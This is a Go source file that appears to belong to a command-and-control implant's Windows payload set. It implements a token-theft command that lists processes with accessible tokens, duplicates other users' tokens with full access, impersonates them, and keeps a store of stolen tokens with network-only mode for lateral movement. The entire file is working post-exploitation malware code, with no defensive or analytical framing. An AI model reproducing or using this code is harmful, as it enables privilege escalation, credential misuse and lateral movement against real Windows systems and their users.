// server/docker/payloads/Windows/action_steal_token_windows.go
//go:build windows
// +build windows

package main

import (
	"fmt"
	"strings"
	"sync"
	"syscall"
	"time"
	"unsafe"
)

// TokenMetadata stores metadata about a token
type TokenMetadata struct {
	User        string
	Domain      string
	Source      string // "stolen" or "created"
	SourcePID   uint32 // For stolen tokens
	ProcessName string // For stolen tokens
	LogonType   string // For created tokens
	StoredAt    time.Time
	TokenType   string // "primary" or "impersonation"
	NetOnly     bool   // Whether this token is for network operations only
}

// UnifiedTokenStore manages all tokens (stolen and created)
type UnifiedTokenStore struct {
	mu              sync.RWMutex
	Tokens          map[string]syscall.Handle // Named tokens
	Metadata        map[string]TokenMetadata  // Token metadata
	ActiveToken     string                    // Currently active token name
	OriginalUser    string
	OriginalDomain  string
	IsImpersonating bool
	NetOnlyToken    string         // Currently active network-only token
	NetOnlyHandle   syscall.Handle // Handle for network-only operations
}

// Global token store shared between commands
var globalTokenStore = &UnifiedTokenStore{
	Tokens:   make(map[string]syscall.Handle),
	Metadata: make(map[string]TokenMetadata),
}

// StealTokenCommand handles Windows token theft (kept for delegation from TokenCommand)
type StealTokenCommand struct{}

func (c *StealTokenCommand) listTokens() CommandResult {
	var output strings.Builder

	processes, err := getProcessList()
	if err != nil {
		return CommandResult{
			Output:      Err(E43),
			ExitCode:    1,
			CompletedAt: time.Now().Format(time.RFC3339),
		}
	}

	accessibleCount := 0
	deniedCount := 0
	currentPID := uint32(syscall.Getpid())

	// Count processes for table marker
	procCount := 0
	for _, proc := range processes {
		if proc.PID != 0 {
			procCount++
		}
	}
	output.WriteString(Table(TPSTok, procCount) + "\n")

	for _, proc := range processes {
		if proc.PID == 0 {
			continue
		}

		status := ""
		userInfo := ""

		if handle, err := OpenProcess(PROCESS_QUERY_INFORMATION, false, uint32(proc.PID)); err == nil {
			func() {
				defer CloseHandle(handle)

				var token syscall.Token
				if err := OpenProcessToken(handle, TOKEN_QUERY|TOKEN_DUPLICATE, &token); err == nil {
					defer token.Close()

					userName, domainName := c.getTokenUserInfo(syscall.Handle(token))
					if domainName != "" && domainName != "." {
						userInfo = fmt.Sprintf("%s\\%s", domainName, userName)
					} else {
						userInfo = userName
					}

					accessibleCount++
					if uint32(proc.PID) == currentPID {
						status = VCurrent
					} else {
						status = VAccess
					}
				} else {
					deniedCount++
					status = VDenied
					userInfo = VNA
				}
			}()
		} else {
			deniedCount++
			status = VProcDeny
			userInfo = VNA
		}

		output.WriteString(fmt.Sprintf("%-8d %-30s %-25s %s\n",
			proc.PID, proc.Name, userInfo, status))
	}

	// Summary as compact format: accessible,denied
	output.WriteString(fmt.Sprintf("\n%d,%d\n", accessibleCount, deniedCount))

	return CommandResult{
		Output:      output.String(),
		ExitCode:    0,
		CompletedAt: time.Now().Format(time.RFC3339),
	}
}

func (c *StealTokenCommand) stealAndImpersonate(ctx *CommandContext, pid int, name string, netOnly bool) CommandResult {
	var output strings.Builder

	// Open the target process
	handle, err := OpenProcess(PROCESS_QUERY_INFORMATION, false, uint32(pid))
	if err != nil {
		return CommandResult{
			Output:      ErrCtx(E38, fmt.Sprintf("%d", pid)),
			ExitCode:    1,
			CompletedAt: time.Now().Format(time.RFC3339),
		}
	}
	defer CloseHandle(handle)

	// Open the process token
	var processToken syscall.Token
	err = OpenProcessToken(handle, TOKEN_QUERY|TOKEN_DUPLICATE, &processToken)
	if err != nil {
		return CommandResult{
			Output:      Err(E39),
			ExitCode:    1,
			CompletedAt: time.Now().Format(time.RFC3339),
		}
	}
	defer processToken.Close()

	// Get token user info
	targetUser, targetDomain := c.getTokenUserInfo(syscall.Handle(processToken))

	// Get process name
	processes, _ := getProcessList()
	processName := "unknown"
	for _, p := range processes {
		if p.PID == int32(pid) {
			processName = p.Name
			break
		}
	}

	// Auto-generate name if not provided
	if name == "" {
		name = fmt.Sprintf("%s_%s_%d", targetDomain, targetUser, pid)
		// Clean up the name
		name = strings.ReplaceAll(name, " ", "_")
		name = strings.ReplaceAll(name, "\\", "_")
		name = strings.ToLower(name)
	}

	// Get original user info before impersonation
	originalUser, originalDomain := c.getCurrentUserInfo()

	output.WriteString("Stealing:\n")
	output.WriteString(fmt.Sprintf("Original token: %s\\%s\n", originalDomain, originalUser))
	output.WriteString(fmt.Sprintf("Target token: %s\\%s (PID: %d, Process: %s)\n\n",
		targetDomain, targetUser, pid, processName))

	// Duplicate token for impersonation with ALL access rights
	var impersonationToken syscall.Handle
	err = DuplicateTokenEx(
		syscall.Handle(processToken),
		TOKEN_ALL_ACCESS,
		nil,
		SecurityImpersonation,
		TokenImpersonation,
		&impersonationToken,
	)
	if err != nil {
		return CommandResult{
			Output:      Err(E42),
			ExitCode:    1,
			CompletedAt: time.Now().Format(time.RFC3339),
		}
	}

	// Store the token
	globalTokenStore.mu.Lock()

	// Close existing token with same name if it exists
	if existingToken, exists := globalTokenStore.Tokens[name]; exists {
		CloseHandle(existingToken)
	}

	// Store new token and metadata
	globalTokenStore.Tokens[name] = impersonationToken
	globalTokenStore.Metadata[name] = TokenMetadata{
		User:        targetUser,
		Domain:      targetDomain,
		Source:      "s",
		SourcePID:   uint32(pid),
		ProcessName: processName,
		StoredAt:    time.Now(),
		TokenType:   "impersonation",
		NetOnly:     netOnly,
	}

	// Save original user info if not already saved
	if globalTokenStore.OriginalUser == "" {
		globalTokenStore.OriginalUser = originalUser
		globalTokenStore.OriginalDomain = originalDomain
	}

	globalTokenStore.mu.Unlock()

	// Check if this is a network-only token
	if netOnly {
		// Network-only mode - store for network operations but DON'T impersonate
		globalTokenStore.mu.Lock()
		globalTokenStore.NetOnlyToken = name
		globalTokenStore.NetOnlyHandle = impersonationToken
		globalTokenStore.mu.Unlock()

		output.WriteString(Succ(S13) + "\n")
		output.WriteString(fmt.Sprintf("    Network operations will use: %s\\%s\n", targetDomain, targetUser))
		output.WriteString(fmt.Sprintf("    Local operations will remain: %s\\%s\n", originalDomain, originalUser))
		output.WriteString(fmt.Sprintf("    Token stored as: %s\n", name))

		return CommandResult{
			Output:      output.String(),
			ExitCode:    0,
			CompletedAt: time.Now().Format(time.RFC3339),
		}
	}

	// Regular impersonation (non-netonly mode)
	err = ImpersonateLoggedOnUser(impersonationToken)
	if err != nil {
		// Clean up on failure
		globalTokenStore.mu.Lock()
		delete(globalTokenStore.Tokens, name)
		delete(globalTokenStore.Metadata, name)
		globalTokenStore.mu.Unlock()
		CloseHandle(impersonationToken)

		return CommandResult{
			Output:      Err(E42),
			ExitCode:    1,
			CompletedAt: time.Now().Format(time.RFC3339),
		}
	}

	// Update impersonation state
	globalTokenStore.mu.Lock()
	globalTokenStore.IsImpersonating = true
	globalTokenStore.ActiveToken = name
	globalTokenStore.mu.Unlock()

	// Verify impersonation by checking thread token
	var threadToken syscall.Token
	err = OpenThreadToken(GetCurrentThread(), TOKEN_QUERY, true, &threadToken)
	if err != nil {
		output.WriteString("Warning: Could not verify thread impersonation\n")
		newUser, newDomain := c.getCurrentUserInfo()
		output.WriteString(fmt.Sprintf("    Process still shows: %s\\%s\n", newDomain, newUser))
	} else {
		defer threadToken.Close()
		threadUser, threadDomain := c.getTokenUserInfo(syscall.Handle(threadToken))
		output.WriteString(Succ(S10) + "\n")
		output.WriteString(fmt.Sprintf("    Thread now running as: %s\\%s\n", threadDomain, threadUser))
		output.WriteString(fmt.Sprintf("    Token stored as: %s\n", name))
	}

	return CommandResult{
		Output:      output.String(),
		ExitCode:    0,
		CompletedAt: time.Now().Format(time.RFC3339),
	}
}

func (c *StealTokenCommand) storeToken(ctx *CommandContext, pid int, name string, netOnly bool) CommandResult {
	var output strings.Builder

	// Open the target process
	handle, err := OpenProcess(PROCESS_QUERY_INFORMATION, false, uint32(pid))
	if err != nil {
		return CommandResult{
			Output:      ErrCtx(E38, fmt.Sprintf("%d", pid)),
			ExitCode:    1,
			CompletedAt: time.Now().Format(time.RFC3339),
		}
	}
	defer CloseHandle(handle)

	// Open the process token
	var processToken syscall.Token
	err = OpenProcessToken(handle, TOKEN_QUERY|TOKEN_DUPLICATE, &processToken)
	if err != nil {
		return CommandResult{
			Output:      Err(E39),
			ExitCode:    1,
			CompletedAt: time.Now().Format(time.RFC3339),
		}
	}
	defer processToken.Close()

	// Get token user info
	targetUser, targetDomain := c.getTokenUserInfo(syscall.Handle(processToken))

	// Get process name
	processes, _ := getProcessList()
	processName := "unknown"
	for _, p := range processes {
		if p.PID == int32(pid) {
			processName = p.Name
			break
		}
	}

	// Duplicate token
	var duplicatedToken syscall.Handle
	err = DuplicateTokenEx(
		syscall.Handle(processToken),
		MAXIMUM_ALLOWED,
		nil,
		SecurityImpersonation,
		TokenImpersonation,
		&duplicatedToken,
	)
	if err != nil {
		return CommandResult{
			Output:      Err(E42),
			ExitCode:    1,
			CompletedAt: time.Now().Format(time.RFC3339),
		}
	}

	// Store the token
	globalTokenStore.mu.Lock()

	// Close existing token with same name if it exists
	if existingToken, exists := globalTokenStore.Tokens[name]; exists {
		CloseHandle(existingToken)
	}

	globalTokenStore.Tokens[name] = duplicatedToken
	globalTokenStore.Metadata[name] = TokenMetadata{
		User:        targetUser,
		Domain:      targetDomain,
		Source:      "s",
		SourcePID:   uint32(pid),
		ProcessName: processName,
		StoredAt:    time.Now(),
		TokenType:   "impersonation",
		NetOnly:     netOnly,
	}

	// Save original user info if not already saved
	if globalTokenStore.OriginalUser == "" {
		originalUser, originalDomain := c.getCurrentUserInfo()
		globalTokenStore.OriginalUser = originalUser
		globalTokenStore.OriginalDomain = originalDomain
	}

	globalTokenStore.mu.Unlock()

	output.WriteString(Succ(S11) + "\n")
	output.WriteString(fmt.Sprintf("    Name: %s\n", name))
	output.WriteString(fmt.Sprintf("    User: %s\\%s\n", targetDomain, targetUser))
	output.WriteString(fmt.Sprintf("    Source: %s (PID: %d)\n", processName, pid))

	if netOnly {
		output.WriteString("    Mode: Network-Only\n")
	} else {
		output.WriteString("    Mode: Full Impersonation\n")
	}

	return CommandResult{
		Output:      output.String(),
		ExitCode:    0,
		CompletedAt: time.Now().Format(time.RFC3339),
	}
}

func (c *StealTokenCommand) useStoredToken(ctx *CommandContext, name string, netOnly bool) CommandResult {
	globalTokenStore.mu.RLock()
	token, exists := globalTokenStore.Tokens[name]
	globalTokenStore.mu.RUnlock()

	if !exists {
		return CommandResult{
			Output:      ErrCtx(E47, name),
			ExitCode:    1,
			CompletedAt: time.Now().Format(time.RFC3339),
		}
	}

	// If netonly mode requested, set as network-only token
	if netOnly {
		return c.setNetOnlyToken(ctx, name)
	}

	var output strings.Builder

	// Get current user before switching
	currentUser, currentDomain := c.getCurrentUserInfo()

	// Revert any current impersonation first
	RevertToSelf()

	// Impersonate the token
	err := ImpersonateLoggedOnUser(token)
	if err != nil {
		return CommandResult{
			Output:      Err(E42),
			ExitCode:    1,
			CompletedAt: time.Now().Format(time.RFC3339),
		}
	}

	// Update global state
	globalTokenStore.mu.Lock()
	globalTokenStore.IsImpersonating = true
	globalTokenStore.ActiveToken = name
	globalTokenStore.mu.Unlock()

	// Verify impersonation
	var threadToken syscall.Token
	err = OpenThreadToken(GetCurrentThread(), TOKEN_QUERY, true, &threadToken)
	if err != nil {
		output.WriteString(Err(E42) + "\n")
	} else {
		defer threadToken.Close()
		actualUser, actualDomain := c.getTokenUserInfo(syscall.Handle(threadToken))
		output.WriteString(Succ(S12) + "\n")
		output.WriteString(fmt.Sprintf("    Previous: %s\\%s\n", currentDomain, currentUser))
		output.WriteString(fmt.Sprintf("    Current: %s\\%s\n", actualDomain, actualUser))
		output.WriteString(fmt.Sprintf("    Token: %s\n", name))
	}

	return CommandResult{
		Output:      output.String(),
		ExitCode:    0,
		CompletedAt: time.Now().Format(time.RFC3339),
	}
}

func (c *StealTokenCommand) listStoredTokens() CommandResult {
	var output strings.Builder
	output.WriteString("Stored:\n")

	globalTokenStore.mu.RLock()
	defer globalTokenStore.mu.RUnlock()

	if len(globalTokenStore.Tokens) == 0 {
		return CommandResult{
			Output:      Succ(S0),
			ExitCode:    0,
			CompletedAt: time.Now().Format(time.RFC3339),
		}
	}

	output.WriteString(fmt.Sprintf("%-15s %-20s %-10s %-25s %-15s %-8s %s\n",
		"Name", "User", "Source", "Details", "Stored", "Mode", "Status"))

	for name, metadata := range globalTokenStore.Metadata {
		userInfo := fmt.Sprintf("%s\\%s", metadata.Domain, metadata.User)

		details := ""
		if metadata.Source == "stolen" {
			procName := metadata.ProcessName
			if len(procName) > 15 {
				procName = procName[:12] + "..."
			}
			details = fmt.Sprintf("%s (PID:%d)", procName, metadata.SourcePID)
		} else if metadata.Source == "created" {
			details = fmt.Sprintf("LogonType: %s", metadata.LogonType)
		}

		storedAt := metadata.StoredAt.Format("15:04:05")

		mode := "Full"
		if metadata.NetOnly {
			mode = "NetOnly"
		}

		status := ""
		if globalTokenStore.IsImpersonating && globalTokenStore.ActiveToken == name {
			status = "[ACTIVE]"
		} else if globalTokenStore.NetOnlyToken == name {
			status = "[NETONLY]"
		}

		output.WriteString(fmt.Sprintf("%-15s %-20s %-10s %-25s %-15s %-8s %s\n",
			name, userInfo, metadata.Source, details, storedAt, mode, status))
	}

	output.WriteString(fmt.Sprintf("\nTotal: %d tokens\n", len(globalTokenStore.Tokens)))

	// Show current status
	output.WriteString("\nStatus:\n")
	currentUser, currentDomain := c.getCurrentUserInfo()
	output.WriteString(fmt.Sprintf("Process User: %s\\%s\n", currentDomain, currentUser))

	if globalTokenStore.IsImpersonating {
		output.WriteString(fmt.Sprintf("Impersonating: %s\n", globalTokenStore.ActiveToken))
	}

	if globalTokenStore.NetOnlyToken != "" {
		output.WriteString(fmt.Sprintf("NetOnly Token: %s\n", globalTokenStore.NetOnlyToken))
	}

	return CommandResult{
		Output:      output.String(),
		ExitCode:    0,
		CompletedAt: time.Now().Format(time.RFC3339),
	}
}

func (c *StealTokenCommand) removeStoredToken(ctx *CommandContext, name string) CommandResult {
	globalTokenStore.mu.Lock()
	defer globalTokenStore.mu.Unlock()

	token, exists := globalTokenStore.Tokens[name]
	if !exists {
		return CommandResult{
			Output:      ErrCtx(E47, name),
			ExitCode:    1,
			CompletedAt: time.Now().Format(time.RFC3339),
		}
	}

	// Don't allow removing the active token
	if globalTokenStore.IsImpersonating && globalTokenStore.ActiveToken == name {
		return CommandResult{
			Output:      ErrCtx(E48, name),
			ExitCode:    1,
			CompletedAt: time.Now().Format(time.RFC3339),
		}
	}

	// Don't allow removing the active network-only token
	if globalTokenStore.NetOnlyToken == name {
		return CommandResult{
			Output:      ErrCtx(E48, name),
			ExitCode:    1,
			CompletedAt: time.Now().Format(time.RFC3339),
		}
	}

	// Close the token handle
	CloseHandle(token)

	// Remove from store
	delete(globalTokenStore.Tokens, name)
	delete(globalTokenStore.Metadata, name)

	return CommandResult{
		Output:      SuccCtx(S2, name),
		ExitCode:    0,
		CompletedAt: time.Now().Format(time.RFC3339),
	}
}

func (c *StealTokenCommand) getCurrentTokenInfo() CommandResult {
	var output strings.Builder
	output.WriteString("Token Info:\n")

	// Get current process/thread token info
	currentUser, currentDomain := c.getCurrentUserInfo()
	output.WriteString(fmt.Sprintf("Process User: %s\\%s\n", currentDomain, currentUser))

	globalTokenStore.mu.RLock()
	defer globalTokenStore.mu.RUnlock()

	if globalTokenStore.IsImpersonating && globalTokenStore.ActiveToken != "" {
		output.WriteString(fmt.Sprintf("\nImpersonating Token: %s\n", globalTokenStore.ActiveToken))
		if metadata, exists := globalTokenStore.Metadata[globalTokenStore.ActiveToken]; exists {
			output.WriteString(fmt.Sprintf("  User: %s\\%s\n", metadata.Domain, metadata.User))
			output.WriteString(fmt.Sprintf("  Source: %s\n", metadata.Source))
			if metadata.Source == "stolen" {
				output.WriteString(fmt.Sprintf("  Process: %s (PID: %d)\n", metadata.ProcessName, metadata.SourcePID))
			} else if metadata.Source == "created" {
				output.WriteString(fmt.Sprintf("  Logon Type: %s\n", metadata.LogonType))
			}
		}
	} else {
		output.WriteString("\nNo active impersonation\n")
	}

	if globalTokenStore.NetOnlyToken != "" {
		output.WriteString(fmt.Sprintf("\nNetwork-Only Token: %s\n", globalTokenStore.NetOnlyToken))
		if metadata, exists := globalTokenStore.Metadata[globalTokenStore.NetOnlyToken]; exists {
			output.WriteString(fmt.Sprintf("  User: %s\\%s\n", metadata.Domain, metadata.User))
			output.WriteString(fmt.Sprintf("  Source: %s\n", metadata.Source))
		}
	}

	if globalTokenStore.OriginalUser != "" {
		output.WriteString(fmt.Sprintf("\nOriginal User: %s\\%s\n", globalTokenStore.OriginalDomain, globalTokenStore.OriginalUser))
	}

	return CommandResult{
		Output:      output.String(),
		ExitCode:    0,
		CompletedAt: time.Now().Format(time.RFC3339),
	}
}

func (c *StealTokenCommand) setNetOnlyToken(ctx *CommandContext, name string) CommandResult {
	globalTokenStore.mu.Lock()
	defer globalTokenStore.mu.Unlock()

	token, exists := globalTokenStore.Tokens[name]
	if !exists {
		return CommandResult{
			Output:      ErrCtx(E47, name),
			ExitCode:    1,
			CompletedAt: time.Now().Format(time.RFC3339),
		}
	}

	metadata := globalTokenStore.Metadata[name]

	// Set as network-only token WITHOUT immediately impersonating
	// The impersonation will happen on-demand when network operations are performed
	globalTokenStore.NetOnlyToken = name
	globalTokenStore.NetOnlyHandle = token
	metadata.NetOnly = true
	globalTokenStore.Metadata[name] = metadata

	// DON'T call ImpersonateLoggedOnUser here!
	// This was the bug - it was applying impersonation to the main thread
	// which would then persist across operations

	// REMOVED THIS PROBLEMATIC CODE:
	// err := ImpersonateLoggedOnUser(token)
	// if err != nil {
	//     return CommandResult{
	//         Output:      fmt.Sprintf("Failed to activate network-only token: %v", err),
	//         ExitCode:    1,
	//         CompletedAt: time.Now().Format(time.RFC3339),
	//     }
	// }

	var output strings.Builder
	output.WriteString(Succ(S13) + "\n")
	output.WriteString(fmt.Sprintf("    Token: %s\n", name))
	output.WriteString(fmt.Sprintf("    User: %s\\%s\n", metadata.Domain, metadata.User))
	output.WriteString("    Note: Token will be applied only for network operations\n")

	return CommandResult{
		Output:      output.String(),
		ExitCode:    0,
		CompletedAt: time.Now().Format(time.RFC3339),
	}
}

func (c *StealTokenCommand) clearNetOnlyToken(ctx *CommandContext) CommandResult {
	globalTokenStore.mu.Lock()
	defer globalTokenStore.mu.Unlock()

	if globalTokenStore.NetOnlyToken == "" {
		return CommandResult{
			Output:      Succ(S0),
			ExitCode:    0,
			CompletedAt: time.Now().Format(time.RFC3339),
		}
	}

	// DON'T call RevertToSelf here - we're just clearing the reference
	// The actual impersonation cleanup happens when operations complete
	// or when rev2self is called

	// REMOVED THIS LINE:
	// RevertToSelf()

	// Update metadata to clear netonly flag
	if metadata, exists := globalTokenStore.Metadata[globalTokenStore.NetOnlyToken]; exists {
		metadata.NetOnly = false
		globalTokenStore.Metadata[globalTokenStore.NetOnlyToken] = metadata
	}

	previousToken := globalTokenStore.NetOnlyToken
	globalTokenStore.NetOnlyToken = ""
	globalTokenStore.NetOnlyHandle = 0

	return CommandResult{
		Output:      SuccCtx(S2, previousToken),
		ExitCode:    0,
		CompletedAt: time.Now().Format(time.RFC3339),
	}
}

func (c *StealTokenCommand) showNetOnlyStatus() CommandResult {
	globalTokenStore.mu.RLock()
	defer globalTokenStore.mu.RUnlock()

	var output strings.Builder
	output.WriteString("NetOnly:\n")

	if globalTokenStore.NetOnlyToken == "" {
		output.WriteString(Succ(S0) + "\n")
	} else {
		metadata := globalTokenStore.Metadata[globalTokenStore.NetOnlyToken]
		output.WriteString(fmt.Sprintf("Active NetOnly Token: %s\n", globalTokenStore.NetOnlyToken))
		output.WriteString(fmt.Sprintf("User: %s\\%s\n", metadata.Domain, metadata.User))
		output.WriteString(fmt.Sprintf("Source: %s\n", metadata.Source))
		if metadata.Source == "stolen" {
			output.WriteString(fmt.Sprintf("Process: %s (PID: %d)\n", metadata.ProcessName, metadata.SourcePID))
		} else if metadata.Source == "created" {
			output.WriteString(fmt.Sprintf("Logon Type: %s\n", metadata.LogonType))
		}
	}

	// List all tokens marked as netonly
	output.WriteString("\nNetOnly Tokens:\n")
	hasNetOnlyTokens := false
	for name, metadata := range globalTokenStore.Metadata {
		if metadata.NetOnly {
			hasNetOnlyTokens = true
			output.WriteString(fmt.Sprintf("  %s: %s\\%s\n", name, metadata.Domain, metadata.User))
		}
	}
	if !hasNetOnlyTokens {
		output.WriteString("  (none)\n")
	}

	return CommandResult{
		Output:      output.String(),
		ExitCode:    0,
		CompletedAt: time.Now().Format(time.RFC3339),
	}
}

// Helper functions
func (c *StealTokenCommand) getCurrentUserInfo() (string, string) {
	// Try to get from current thread token first (impersonation)
	var threadToken syscall.Token
	err := OpenThreadToken(GetCurrentThread(), TOKEN_QUERY, true, &threadToken)
	if err == nil {
		defer threadToken.Close()
		return c.getTokenUserInfo(syscall.Handle(threadToken))
	}

	// Fall back to process token
	token, err := syscall.OpenCurrentProcessToken()
	if err == nil {
		defer token.Close()
		return c.getTokenUserInfo(syscall.Handle(token))
	}

	return "Unknown", "Unknown"
}

func (c *StealTokenCommand) getTokenUserInfo(token syscall.Handle) (string, string) {
	// Get required buffer size
	var needed uint32
	procGetTokenInformation.Call(
		uintptr(token),
		1, // TokenUser
		0,
		0,
		uintptr(unsafe.Pointer(&needed)),
	)

	if needed == 0 {
		return "Unknown", ""
	}

	// Allocate buffer and get token information
	buffer := make([]byte, needed)
	ret, _, _ := procGetTokenInformation.Call(
		uintptr(token),
		1, // TokenUser
		uintptr(unsafe.Pointer(&buffer[0])),
		uintptr(needed),
		uintptr(unsafe.Pointer(&needed)),
	)

	if ret == 0 {
		return "Unknown", ""
	}

	// Extract SID from buffer
	tokenUser := (*TokenUser)(unsafe.Pointer(&buffer[0]))

	// Convert SID to username
	var nameSize, domainSize uint32 = 256, 256
	nameBuffer := make([]uint16, nameSize)
	domainBuffer := make([]uint16, domainSize)
	var sidType uint32

	ret, _, _ = procLookupAccountSidW.Call(
		0, // Local system
		uintptr(unsafe.Pointer(tokenUser.User.Sid)),
		uintptr(unsafe.Pointer(&nameBuffer[0])),
		uintptr(unsafe.Pointer(&nameSize)),
		uintptr(unsafe.Pointer(&domainBuffer[0])),
		uintptr(unsafe.Pointer(&domainSize)),
		uintptr(unsafe.Pointer(&sidType)),
	)

	if ret == 0 {
		return "Unknown", ""
	}

	return syscall.UTF16ToString(nameBuffer[:nameSize]),
		syscall.UTF16ToString(domainBuffer[:domainSize])
}

// getProcessList returns a list of all processes
func getProcessList() ([]ProcessInfo, error) {
	snapshot, err := syscall.CreateToolhelp32Snapshot(syscall.TH32CS_SNAPPROCESS, 0)
	if err != nil {
		return nil, err
	}
	defer syscall.CloseHandle(snapshot)

	var processes []ProcessInfo

	var pe32 syscall.ProcessEntry32
	pe32.Size = uint32(unsafe.Sizeof(pe32))

	err = syscall.Process32First(snapshot, &pe32)
	if err != nil {
		return nil, err
	}

	for {
		processName := syscall.UTF16ToString(pe32.ExeFile[:])
		processes = append(processes, ProcessInfo{
			PID:  int32(pe32.ProcessID),
			Name: processName,
		})

		err = syscall.Process32Next(snapshot, &pe32)
		if err != nil {
			break
		}
	}

	return processes, nil
}
